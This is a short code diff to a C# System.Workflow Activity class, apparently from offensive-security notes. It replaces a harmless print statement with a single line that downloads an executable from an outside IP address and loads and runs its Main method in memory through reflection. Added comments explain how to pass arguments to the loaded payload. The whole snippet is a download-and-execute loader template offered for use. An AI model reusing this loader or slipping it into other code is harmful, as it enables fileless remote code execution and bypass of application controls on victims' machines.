@@ -2,6 +2,13 @@
 using System.Workflow.ComponentModel;
 public class Run : Activity{
     public Run() {
-        Console.WriteLine("I executed!");
+        System.Reflection.Assembly.Load(new System.Net.WebClient().DownloadData("http://192.168.49.102/<BINARY>.exe")).GetType("<NAMESPACE>.<CLASS_NAME>").GetMethod("Main").Invoke(0, new object[] { });
     }
 }
+# - make sure the method you are invoking is public
+# - if there are arguments eg 'audit' for the Main method you are calling:
+# Invoke(0, new object[] { new string[] { "audit" } });
+# - if there NO arguments but the Main method CAN have string arguments:
+# Invoke(0, new object[] { new string[] {  } });
+# - if there are NO arguments for the Main method you are calling:
+# Invoke(0, new object[] { });
